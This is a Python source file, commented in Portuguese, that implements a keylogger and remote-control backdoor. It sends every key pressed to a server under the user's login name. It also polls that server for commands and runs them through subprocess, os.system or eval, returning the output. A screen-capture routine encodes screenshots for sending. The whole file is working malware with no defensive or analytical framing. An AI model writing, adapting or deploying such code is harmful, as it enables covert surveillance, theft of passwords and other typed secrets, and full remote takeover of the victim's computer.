from PIL import ImageGrab
import base64
import io
import keyboard
import os
import psutil
import pyautogui
import requests
import socket
import subprocess
import sys


class Keylogger(object):

    __status = False


    def __init__(self, host = "localhost"):

        self.__server = host

        user = os.getlogin().replace(" ", "%20")

        self.__urls = {
            "input_url": self.__server + "/" + user + "/input",
            "output_url": self.__server + "/" + user + "/output",
            "keylogger_url": self.__server + "/" + user + "/keylogger"
        }


    def activate(self):

        """
        Ativa o envio de teclas.
        """

        self.__status = True


    def exec_command(self, command):

        """
        Executa um comando.

        $ Comando de terminal pelo subprocess
        & Comando de terminal pelo os.system
        # Instrução Python
        """

        functions = {"$": subprocess.getoutput, "&": os.system, "#": eval}

        # Obtém o código do envio e o comando que será executado.
        code, command = command.split(":", maxsplit = 1)
        command = command.strip()

        try:
            function = functions.get(command[0], None)

            if not function: raise ReferenceError("Enter an identifier before the command.")
            result = str(function(command[1:]))

        except Exception as error: 
            result = str(error)

        finally: 
            self.send(self.__urls["output_url"], code + ":" + result)


    def print_screen(self):

        """
        Obtém uma imagem da tela do usuário e 
        retorna os seus bytes codificados.
        """

        img_bytes = io.BytesIO()

        image = ImageGrab.grab()
        image.save(img_bytes, "PNG")

        return base64.b64encode(img_bytes.getvalue()).decode()


    def send(self, url, text = ""):

        """
        Envia texto ao servidor.
        """

        try: requests.post(url, json = {"text": text})
        except: pass


    def send_key(self, key):

        """
        Envia a tecla pressionada.
        """

        if self.__status: self.send(self.__urls["keylogger_url"], str(key.name + " "))


    def stop(self):

        """
        Interrompe o envio de teclas.
        """

        self.__status = False


    def run(self):

        """
        Inicializa o keylogger.
        """

        keyboard.on_press(self.send_key)

        while True:

            try:
                # Obtém o comando do servidor.
                response = requests.get(self.__urls["input_url"])

                # Verifica se houve algum problema.
                if response.status_code != 200: 
                    raise ConnectionError("Status: %i" % response.status_code)
            
                # Obtém o comando e o executa caso ele não seja 
                # uma string vazia ou somente espaços.
                command = response.content.decode()

                if command and not command.isspace(): self.exec_command(command)

            except: continue
 



